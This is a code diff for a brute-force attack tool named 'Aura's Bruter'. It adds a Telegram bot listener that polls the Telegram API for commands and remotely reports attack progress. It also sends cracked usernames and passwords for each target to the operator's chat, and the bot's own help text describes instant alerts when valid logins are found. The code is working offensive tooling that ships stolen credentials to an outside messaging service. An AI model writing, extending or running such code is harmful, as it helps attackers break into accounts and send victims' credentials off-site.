@@ -158,6 +158,132 @@ class TelegramBot:
             self._internet_available = False
             return False
     
+    def _listener_loop(self):
+        """Background thread that listens for incoming commands."""
+        while self._running:
+            try:
+                updates = self._get_updates()
+                for update in updates:
+                    self._handle_command(update)
+                
+                # Poll every 2 seconds
+                time.sleep(2)
+                
+            except Exception:
+                time.sleep(5)  # Wait longer on error
+    
+    def _get_updates(self) -> list:
+        """Get new messages from Telegram."""
+        try:
+            import urllib.request
+            import json
+            
+            url = f"https://api.telegram.org/bot{self.config.bot_token}/getUpdates"
+            url += f"?offset={self._last_update_id + 1}&timeout=1"
+            
+            with urllib.request.urlopen(url, timeout=5) as response:
+                result = json.loads(response.read().decode())
+                
+                if result.get("ok"):
+                    updates = result.get("result", [])
+                    if updates:
+                        self._last_update_id = updates[-1]["update_id"]
+                    return updates
+                    
+        except Exception:
+            pass
+        
+        return []
+    
+    def _handle_command(self, update: dict):
+        """Handle an incoming command."""
+        try:
+            message = update.get("message", {})
+            text = message.get("text", "").strip().lower()
+            chat_id = message.get("chat", {}).get("id")
+            
+            # Only respond to our configured chat
+            if str(chat_id) != str(self.config.chat_id):
+                return
+            
+            if text == "/seeresults" or text == "/results":
+                self._cmd_seeresults()
+            elif text == "/seestatus" or text == "/status":
+                self._cmd_seestatus()
+            elif text == "/help":
+                self._cmd_help()
+            elif text == "/start":
+                self._cmd_start()
+                
+        except Exception:
+            pass
+    
+    def _cmd_seeresults(self):
+        """Handle /seeresults command."""
+        if not self._found_credentials:
+            self.send("🔒 No credentials found yet.\n\nStart an attack to find credentials.")
+            return
+        
+        msg = f"🔓 <b>Found {len(self._found_credentials)} Credential(s)</b>\n\n"
+        
+        for i, cred in enumerate(self._found_credentials, 1):
+            msg += f"<b>[{i}]</b> {cred['target']}\n"
+            msg += f"   👤 <code>{cred['username']}</code>\n"
+            msg += f"   🔑 <code>{cred['password']}</code>\n"
+            if cred.get('found_at'):
+                msg += f"   ⏰ {cred['found_at'][:19]}\n"
+            msg += "\n"
+        
+        self.send(msg)
+    
+    def _cmd_seestatus(self):
+        """Handle /seestatus command."""
+        if not self._attack_engine:
+            self.send("📊 No attack currently running.\n\nStart an attack from the Aura's Bruter tool.")
+            return
+        
+        stats = self._attack_engine.get_status()
+        
+        msg = (
+            f"📊 <b>Attack Status</b>\n\n"
+            f"🎯 Target: {stats.get('target', 'N/A')}\n"
+            f"📈 Progress: {stats.get('progress', 0):.1f}%\n"
+            f"🔢 Tested: {stats.get('tested', 0):,} / {stats.get('total', 0):,}\n"
+            f"⚡ Speed: {stats.get('speed', 0):.1f}/s\n"
+            f"🔓 Found: {stats.get('found', 0)}\n"
+            f"⏱ Elapsed: {stats.get('elapsed', '00:00:00')}\n"
+        )
+        
+        self.send(msg)
+    
+    def _cmd_help(self):
+        """Handle /help command."""
+        msg = (
+            "🔓 <b>Aura's Bruter Commands</b>\n\n"
+            "/seeresults - View found credentials\n"
+            "/seestatus - View current attack status\n"
+            "/sessions - List saved sessions\n"
+            "/help - Show this help message\n\n"
+            "💡 <i>Tip: The bot sends alerts automatically when credentials are found!</i>"
+        )
+        self.send(msg)
+    
+    def _cmd_start(self):
+        """Handle /start command."""
+        msg = (
+            "🔓 <b>Aura's Bruter Remote Monitor</b>\n\n"
+            "This bot sends you real-time notifications during brute force attacks:\n\n"
+            "📊 Attack Progress - Live updates on attempts, speed, and ETA\n"
+            "🔓 Found Credentials - Instant alerts when valid logins are found\n"
+            "📁 Session Management - View and resume saved sessions\n\n"
+            "<b>Commands:</b>\n"
+            "/seestatus - View current attack status\n"
+            "/seeresults - See found credentials\n"
+            "/sessions - List saved attack sessions\n"
+            "/help - Get help and usage info"
+        )
+        self.send(msg)
+    
     def send(self, text: str, force: bool = False):
         """Queue a message for sending."""
         if not self.config.enabled or not self._running:
